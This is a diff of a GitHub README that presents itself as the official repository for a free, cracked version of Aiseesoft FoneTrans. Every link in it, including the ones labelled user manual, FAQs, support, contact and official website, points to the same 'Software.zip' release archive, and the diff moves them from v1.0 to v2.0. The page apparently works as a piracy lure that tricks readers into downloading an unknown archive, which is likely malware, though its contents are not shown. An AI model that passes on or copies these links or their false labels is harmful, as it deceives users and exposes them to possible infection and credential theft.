@@ -7,7 +7,7 @@ Welcome to the official repository for Aiseesoft FoneTrans Free - your ultimate 
 - **Name:** Aiseesoft-FoneTrans-Free
 - **Description:** Explore aiseesoft studio fonetrans, aiseesoft fonetrans crack mac, email ativar o aiseesoft fonetrans, aiseesoft fonetrans ios transfer, and much more!
 - **Topics:** aiseesoft-fonetrans, aiseesoft-fonetrans-crack-mac, aiseesoft-fonetrans-dmg-download, and more.
-- **Link:** [Download Aiseesoft FoneTrans Free](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip) 🚀
+- **Link:** [Download Aiseesoft FoneTrans Free](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip) 🚀
 
 ## 📥 Getting Started
 
@@ -31,17 +31,17 @@ To get started with Aiseesoft FoneTrans Free, simply download the latest version
 
 ## 🎉 Resources
 
-- [User Manual](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip): Explore the in-depth user manual for detailed instructions.
-- [FAQs](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip): Find answers to common questions and troubleshoot any issues.
-- [Support](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip): Contact our support team for any assistance or queries.
+- [User Manual](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip): Explore the in-depth user manual for detailed instructions.
+- [FAQs](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip): Find answers to common questions and troubleshoot any issues.
+- [Support](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip): Contact our support team for any assistance or queries.
 
 ## 📧 Contact Us
 
-Have any questions or feedback? Feel free to reach out to us at [https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip). We value your input and are here to assist you in any way we can.
+Have any questions or feedback? Feel free to reach out to us at [https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip). We value your input and are here to assist you in any way we can.
 
 ## 🌐 Visit Our Website
 
-For more information about Aiseesoft Studio and our range of products, visit our official website: [Aiseesoft Studio](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v1.0/Software.zip).
+For more information about Aiseesoft Studio and our range of products, visit our official website: [Aiseesoft Studio](https://github.com/febryalstars/Aiseesoft-FoneTrans-Free/releases/download/v2.0/Software.zip).
 
 ---
 
